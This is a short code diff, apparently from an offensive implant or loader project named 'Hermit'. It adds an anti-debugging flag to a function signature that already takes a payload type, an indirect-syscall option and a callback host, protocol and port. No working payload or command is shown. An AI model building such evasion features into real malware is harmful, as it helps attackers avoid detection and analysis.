@@ -13,6 +13,7 @@ namespace Hermit
 		INT             nCmdShow,
 		LPCWSTR			lpPayloadType,
 		BOOL			bIndirectSyscalls,
+		BOOL			bAntiDebug,
 		LPCWSTR			lpProtocol,
 		LPCWSTR 		lpHost,
 		INTERNET_PORT 	nPort,
